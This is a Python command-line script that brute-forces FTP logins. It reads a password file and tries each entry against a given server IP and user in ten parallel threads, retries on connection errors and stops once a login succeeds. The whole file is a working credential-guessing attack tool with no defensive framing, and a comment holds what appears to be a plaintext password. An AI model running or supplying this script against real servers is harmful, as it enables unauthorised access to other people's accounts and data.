#!/usr/bin/env python3
import ftplib
from ftplib import error_reply
import argparse
import os
import time
import threading
from concurrent.futures import ThreadPoolExecutor

LOCK = threading.Lock()
STOP = False
# psw: iecohphaiv7aik2Eefoh
def cprint(*args, color="white", **kwargs):
    d = {"red": "\u001b[31m", "black": "\u001b[30m", "green": "\u001b[32m", "yellow": "\u001b[33m",
         "blue": "\u001b[34m", "white": "\u001b[37m", "end": "\u001b[0m"}

    if color not in d:
        for k in d:
            if color in k:
                color = k
                break
        else:
            color = "white"

    print(d[color], *args, d["end"], **kwargs)


def args():
    parser = argparse.ArgumentParser("ftp brute force")
    parser.add_argument("--file", help="file with passwords", required=True)
    parser.add_argument("-u", "--user", help="user name (login)", default="user")
    parser.add_argument("--ip", help="ftp server ip", required=True)
    parser.add_argument("-p", "--port", help="port", default=21, type=int)
    parser.add_argument("-t", "--timeout", help="timeout to wait server", default=5, type=int)
    return parser.parse_args()


def check_password(user, psw, host, port, timeout):  # flag
    global STOP
    with LOCK:
        if STOP:
            return False
    while 1:
        ftp = ftplib.FTP()
        try:
            ftp.connect(host, port, timeout=timeout)
            ftp.login(user, psw)
            ftp.close()

        except Exception as e:
            # if "[Errno 111]" in str(e) or "[Errno 104]" in str(e):
            if "530" in str(e):
                cprint(f"can't connect with {user} {psw}, error is {e}", color="y")
                return False
            time.sleep(5)
            continue

        cprint(f"Success! connect with {user} {psw}", color="g")
        with LOCK:
            STOP = True
        break
    return True


if __name__ == "__main__":  # данный фай лзапущен само по себе python3 ftp_brute2.py
    options = args()
    passwords_path = options.file  # 'passwords.txt'
    if os.path.exists(passwords_path) and os.path.isfile(passwords_path):
        with open(passwords_path) as file:
            with ThreadPoolExecutor(10) as executor:
                results = []
                for psw in file:
                    with LOCK:
                        if not STOP:
                            executor.submit(check_password, options.user, psw.strip(), options.ip, options.port,
                                    options.timeout)

